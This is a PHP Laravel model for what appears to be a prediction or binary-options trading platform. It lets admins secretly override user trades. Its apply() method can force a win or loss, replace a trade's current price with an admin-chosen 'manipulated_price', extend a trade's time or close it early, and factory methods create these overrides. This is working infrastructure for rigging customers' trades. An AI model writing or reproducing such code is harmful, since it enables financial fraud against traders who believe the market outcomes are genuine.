<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Carbon\Carbon;

class TradeOverride extends Model
{
    use HasFactory;

    protected $fillable = [
        'trade_id',
        'admin_id',
        'override_type',
        'reason',
        'original_price',
        'manipulated_price',
        'original_payout',
        'new_payout',
        'applied',
        'applied_at'
    ];

    protected $casts = [
        'original_price' => 'decimal:8',
        'manipulated_price' => 'decimal:8',
        'original_payout' => 'decimal:2',
        'new_payout' => 'decimal:2',
        'applied' => 'boolean',
        'applied_at' => 'datetime'
    ];

    // Relationships
    public function trade(): BelongsTo
    {
        return $this->belongsTo(PredictionTrade::class, 'trade_id');
    }

    public function admin(): BelongsTo
    {
        return $this->belongsTo(Admin::class);
    }

    // Business Logic Methods
    public function apply(): bool
    {
        if ($this->applied) {
            return false;
        }

        $trade = $this->trade;
        
        switch ($this->override_type) {
            case 'force_win':
                $trade->forceWin($this->reason);
                break;
                
            case 'force_loss':
                $trade->forceLoss($this->reason);
                break;
                
            case 'price_manipulation':
                $trade->updateCurrentPrice((float) $this->manipulated_price);
                break;
                
            case 'extend_time':
                if ($trade->trade_type === 'fixed_time') {
                    $trade->end_time = Carbon::parse($trade->end_time)->addMinutes(30);
                    $trade->save();
                }
                break;
                
            case 'close_early':
                $trade->closeTrade($this->manipulated_price ?? $trade->current_price, true);
                break;
        }

        $this->applied = true;
        $this->applied_at = Carbon::now();
        $this->save();

        return true;
    }

    public function canApply(): bool
    {
        return !$this->applied && $this->trade->isActive();
    }

    // Static factory methods
    public static function createForceWin(int $tradeId, int $adminId, string $reason): self
    {
        return self::create([
            'trade_id' => $tradeId,
            'admin_id' => $adminId,
            'override_type' => 'force_win',
            'reason' => $reason
        ]);
    }

    public static function createForceLoss(int $tradeId, int $adminId, string $reason): self
    {
        return self::create([
            'trade_id' => $tradeId,
            'admin_id' => $adminId,
            'override_type' => 'force_loss',
            'reason' => $reason
        ]);
    }

    public static function createPriceManipulation(
        int $tradeId, 
        int $adminId, 
        float $newPrice, 
        string $reason
    ): self {
        $trade = PredictionTrade::find($tradeId);
        
        return self::create([
            'trade_id' => $tradeId,
            'admin_id' => $adminId,
            'override_type' => 'price_manipulation',
            'reason' => $reason,
            'original_price' => $trade->current_price,
            'manipulated_price' => $newPrice
        ]);
    }

    // Scopes
    public function scopeForTrade($query, int $tradeId)
    {
        return $query->where('trade_id', $tradeId);
    }

    public function scopeByAdmin($query, int $adminId)
    {
        return $query->where('admin_id', $adminId);
    }

    public function scopeApplied($query)
    {
        return $query->where('applied', true);
    }

    public function scopePending($query)
    {
        return $query->where('applied', false);
    }
}
